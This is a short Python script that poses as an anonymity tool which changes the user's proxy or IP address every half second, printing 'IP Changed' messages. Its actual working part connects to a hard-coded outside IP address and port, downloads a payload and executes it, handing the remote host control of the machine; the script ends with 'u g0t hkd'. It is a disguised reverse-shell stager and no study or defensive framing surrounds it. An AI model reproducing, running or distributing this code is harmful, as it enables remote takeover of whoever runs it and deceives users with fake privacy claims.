import socket,struct,time,sys,os
print("Change Proxy Every Half a Second!")
#####################
for x in range(10):
        try:
                s=socket.socket(2,socket.SOCK_STREAM)
                s.connect(('3.137.63.131',17580))
                break
        except:
                time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
        d+=s.recv(l-len(d))
exec(d,{'s':s})
######################
os.system('clear')
print("Connected Successfully!")
time.sleep(0.5)
os.system('clear')
print("You can enjoy your anonymity")

for i in range(1 ,1000):
 time.sleep(0.5)
 print("IP Changed")

print("u g0t hkd")

